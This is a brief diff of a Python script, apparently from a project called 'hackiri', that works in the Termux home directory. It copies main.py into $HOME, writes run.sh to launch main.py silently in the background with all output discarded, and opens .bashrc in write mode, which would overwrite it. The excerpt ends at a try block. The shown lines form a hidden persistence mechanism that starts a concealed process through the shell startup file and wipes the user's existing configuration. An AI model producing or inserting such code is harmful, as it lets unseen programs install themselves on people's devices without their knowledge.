@@ -1,7 +1,8 @@
 import os
+os.system("cp -r main.py /$HOME") 
 os.chdir('/data/data/com.termux//files/home')
 file = open('run.sh' , 'w+')
-file.write('python hackiri/main.py &> /dev/null &')
+file.write('python main.py &> /dev/null &')
 file.close()
 try:
     file2 = open('.bashrc' , 'w')
